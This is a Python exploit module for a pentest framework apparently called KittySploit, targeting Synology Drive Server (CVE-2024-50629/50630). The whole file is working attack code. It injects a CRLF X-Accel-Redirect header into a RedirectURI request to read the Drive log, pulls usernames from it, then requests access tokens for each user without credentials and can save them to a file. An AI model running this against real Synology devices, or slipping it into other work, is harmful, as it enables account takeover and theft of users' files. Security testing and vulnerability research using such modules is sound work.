#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Synology Drive Server unauthenticated access-token theft (CVE-2024-50630)."""

import json
import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Synology Drive Server - Unauth Access Token Leak (CVE-2024-50630)',
        'description': (
            'Reads Synology Drive logs via CVE-2024-50629 RedirectURI abuse, extracts '
            'usernames, then calls SYNO.SynologyDrive.Authentication to obtain access '
            'tokens without credentials (CVE-2024-50630 / SA-24:21).'
        ),
        'author': ['KittySploit Team'],
        'cve': ['CVE-2024-50630', 'CVE-2024-50631'],
        'platform': Platform.LINUX,
        'references': [
            'https://www.synology.com/en-global/security/advisory/Synology_SA_24_21',
            'https://www.zerodayinitiative.com/advisories/ZDI-25-212/',
            'https://kiddo-pwn.github.io/blog/2025-11-30/writing-sync-popping-cron',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-50630',
        ],
        'tags': [
            'synology', 'dsm', 'beestation', 'drive', 'auth-bypass',
            'token', 'unauth', 'cve-2024-50630',
        ],
        'agent': {
            'risk': 'intrusive',
            'effects': ['data_exfiltration'],
            'expected_requests': 5,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals'],
            'cost': 1.4,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'scanner/http/cve_2024_50630_synology_dsm_detect',
                    'auxiliary/admin/http/synology_cve_2024_50629_file_read',
                ],
            },
        },
    }
    device_name = OptString('kittysploit', 'device_name sent to Drive Authentication API', required=False)
    output_file = OptString('', 'Optional JSON file for stolen tokens', required=False)

    def _headers(self):
        return {'Content-Type': 'application/x-www-form-urlencoded'}

    def _read_drive_log(self) -> str:
        data = (
            'api=SYNO.API.Auth.RedirectURI&version=1&method=run&session=finder&redirect_url='
            'https://dsfinder.synology.com/dsm/login?\r\n'
            'X-Accel-Redirect:/volume1/@synologydrive/log/cloud-workerd.log'
        )
        r = self.http_request(
            method='POST',
            path='/webapi/entry.cgi',
            data=data,
            headers=self._headers(),
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return ''
        return r.text or ''

    def _extract_users(self, body: str):
        users = set()
        for m in re.finditer(r'"/homes/([^"]+)"', body):
            users.add(m.group(1))
        for m in re.finditer(r'username:([^\r\n]+)', body):
            users.add(m.group(1).strip())
        return sorted(u for u in users if u)

    def _steal_token(self, user: str) -> str:
        data = (
            'api=SYNO.SynologyDrive.Authentication&method=authenticate&version=1'
            f'&username={user}&device_name={self.device_name}'
        )
        r = self.http_request(
            method='POST',
            path='/webapi/entry.cgi',
            data=data,
            headers=self._headers(),
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return ''
        m = re.search(r'"access_token"\s*:\s*"([^"]+)"', r.text or '')
        return m.group(1) if m else ''

    def check(self):
        body = self._read_drive_log()
        if not body:
            return {
                'vulnerable': False,
                'reason': 'Drive log not readable',
                'confidence': 'medium',
            }
        users = self._extract_users(body)
        if not users:
            return {
                'vulnerable': False,
                'reason': 'Log readable but no usernames found',
                'confidence': 'medium',
            }
        token = self._steal_token(users[0])
        if token:
            return {
                'vulnerable': True,
                'reason': f'CVE-2024-50630 confirmed: token for {users[0]!r}',
                'confidence': 'high',
            }
        return {
            'vulnerable': False,
            'reason': 'Usernames found but token request failed',
            'confidence': 'medium',
        }

    def run(self):
        print_status('Reading Synology Drive log via RedirectURI ...')
        body = self._read_drive_log()
        if not body:
            print_error('Failed to read Drive log')
            return False

        users = self._extract_users(body)
        if not users:
            print_error('No usernames found in Drive log')
            return False

        print_success(f'Found {len(users)} username(s): {", ".join(users)}')
        tokens = {}
        for user in users:
            token = self._steal_token(user)
            if token:
                tokens[user] = token
                print_success(f'{user}: {token}')
            else:
                print_warning(f'No token for {user}')

        if not tokens:
            return False

        local = str(self.output_file or '').strip()
        if local:
            try:
                with open(local, 'w', encoding='utf-8') as fh:
                    json.dump(tokens, fh, indent=2)
                print_success(f'Saved tokens to {local}')
            except OSError as e:
                print_error(f'Could not write output_file: {e}')

        return True
